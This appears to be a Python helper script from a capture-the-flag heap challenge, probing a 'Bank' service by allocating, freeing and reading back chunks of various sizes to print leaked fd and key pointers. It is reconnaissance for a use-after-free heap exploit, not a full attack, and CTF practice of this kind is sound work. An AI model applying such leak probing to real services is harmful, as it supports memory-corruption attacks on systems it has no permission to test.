#!/usr/bin/env python3
import sys, struct
sys.path.insert(0, '/home/boss/Works/ctf/Zero_trace/First_nATIONAL_HEAP_bANK')
from bank import Bank, u64

sizes = [0x20, 0x80, 0x100, 0x400, 0x408, 0x410, 0x411, 0x418, 0x420, 0x4f0, 0x500, 0x1000]
for sz in sizes:
    try:
        b = Bank()
        b.open(0, sz, b'A'*sz)
        b.close(0)
        d = b.view(0)
        cur = b.rawview(0)[:120]
        # Find the header to see stored size
        fd = u64(d[:8]); key = u64(d[8:16])
        # check whether fd/key look like libc/heap
        print(f'sz={sz:#x}: fd={fd:#018x} key={key:#018x} first32={d[:32].hex()}')
        b.s.close()
    except Exception as e:
        print(f'sz={sz:#x}: ERR {type(e).__name__} {e}')
